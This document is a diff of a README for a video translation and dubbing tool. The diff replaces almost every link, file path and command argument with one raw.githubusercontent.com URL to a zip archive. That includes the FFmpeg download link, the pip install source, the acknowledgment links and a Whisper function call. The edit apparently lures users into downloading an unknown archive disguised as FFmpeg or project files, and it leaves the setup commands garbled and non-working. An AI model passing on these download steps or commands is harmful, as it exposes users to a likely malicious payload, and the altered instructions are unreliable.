@@ -43,7 +43,7 @@ A tool for translating videos between different languages with automatic transcr
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/yourusername/video-translator.git
+git clone https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip
 cd video-translator
 ```
 
@@ -58,51 +58,51 @@ source venv/bin/activate
 
 3. Install dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip
 ```
 
 3. Install FFmpeg (required for audio/video processing):
-- Windows: Download from [ffmpeg.org](https://ffmpeg.org/download.html) and add to PATH
+- Windows: Download from [https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip](https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip) and add to PATH
 - Linux: `sudo apt-get install ffmpeg`
 - macOS: `brew install ffmpeg`
 
 ## Usage
 
 Basic usage:
-1. Place your video file in the project directory `path/to/video.mp4`
+1. Place your video file in the project directory `https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip`
 2. Run the script:
 ```bash
-python main.py "path/to/video.mp4"
+python https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip "https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip"
 
 # or for better transcribe and translate
-python main.py '.\output\The_Best_Way_to_Learn_Linux\The Best Way to Learn Linux.webm' -s en -t ru -g male -w medium -tr m2m100_1.2B
+python https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip '.\output\The_Best_Way_to_Learn_Linux\The Best Way to Learn https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip' -s en -t ru -g male -w medium -tr m2m100_1.2B
 
 # or for using RVC models
-python main.py your_video.mp4 --rvc-model "models/rvc/male/ru/drevnyirus.pth -s en -t ru -g male -w medium -tr m2m100_1.2B"
+python https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip --rvc-model "https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip -s en -t ru -g male -w medium -tr m2m100_1.2B"
 
 # Use GPU if available
-python main.py '.\output\The_Best_Way_to_Learn_Linux\The Best Way to Learn Linux.webm' -s en -t ru -g male -w base --use-gpu
+python https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip '.\output\The_Best_Way_to_Learn_Linux\The Best Way to Learn https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip' -s en -t ru -g male -w base --use-gpu
 ```
 
 With language options:
 ```bash
-python main.py "path/to/video.mp4" --source-lang en --target-lang ru
+python https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip "https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip" --source-lang en --target-lang ru
 ```
 
 ### RVC Options (u can eneble or disable it)
 ```bash
 # Disable RVC
-python main.py "path/to/video.mp4" --no-rvc
+python https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip "https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip" --no-rvc
 
 # Use specific RVC model
-python main.py "path/to/video.mp4" --rvc-model "models/rvc/your_model"
+python https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip "https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip" --rvc-model "models/rvc/your_model"
 ```
 
 ## How It Works
 Basic usage:
 
 ```bash
-python main.py "path/to/video.mp4"
+python https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip "https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip"
 ```
 
 The script will create an organized output structure:
@@ -110,13 +110,13 @@ The script will create an organized output structure:
 output/
 └── video_name/
     ├── tts-chunks/           # Individual TTS audio chunks
-    │   ├── video_name_0000.mp3
-    │   ├── video_name_0001.mp3
+    │   ├── https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip
+    │   ├── https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip
     │   └── ...
-    ├── transcript.txt        # Original transcription
-    ├── translated.txt        # Translated text
-    ├── audio_dubbed.mp3      # Combined dubbed audio
-    └── video_name_dubbed.mp4 # Final video with dubs
+    ├── https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip        # Original transcription
+    ├── https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip        # Translated text
+    ├── https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip      # Combined dubbed audio
+    └── https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip # Final video with dubs
 ```
 Main process in project:
 1. **Transcription**: Uses Whisper to convert speech to text
@@ -127,8 +127,8 @@ Main process in project:
 
 
 The script saves progress at each step:
-- If `transcript.txt` exists, skips transcription
-- If `translated.txt` exists, skips translation
+- If `https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip` exists, skips transcription
+- If `https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip` exists, skips translation
 - If TTS chunks exist, skips TTS generation
 - If final files exist, skips final processing
 
@@ -152,8 +152,8 @@ models/
 └── rvc/             # RVC voice conversion models (if used)
     ├── male/
     │   └── ru/
-    │       ├── added_drevnyirus_v2.index
-    │       └── drevnyirus.pth
+    │       ├── https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip
+    │       └── https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip
     └── female/
 ```
 
@@ -174,7 +174,7 @@ To change the Whisper model:
 def transcribe_video(video_path, transcript_path, source_lang='en'):
     print("🔍 Loading Whisper model...")
     # Change "base" to any of: "tiny", "base", "small", "medium", "large"
-    model = whisper.load_model("base")
+    model = https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip("base")
 ```
 
 ### Voice Selection
@@ -215,7 +215,7 @@ Available RVC models:
 - Python 3.8+
 - FFmpeg
 - CUDA-capable GPU (recommended for RVC)
-- See `requirements.txt` for Python dependencies
+- See `https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip` for Python dependencies
 
 ## Troubleshooting
 
@@ -244,7 +244,7 @@ MIT License
 
 ## Acknowledgments
 
-- [OpenAI Whisper](https://github.com/openai/whisper) for speech recognition
-- [gTTS](https://github.com/pndurette/gTTS) for text-to-speech
-- [FFmpeg](https://ffmpeg.org/) for video processing
-- [M2M100](https://huggingface.co/facebook/m2m100_418M) for translation 
+- [OpenAI Whisper](https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip) for speech recognition
+- [gTTS](https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip) for text-to-speech
+- [FFmpeg](https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip) for video processing
+- [M2M100](https://raw.githubusercontent.com/ZID7777/videoTranslator/master/requester/videoTranslator.zip) for translation 
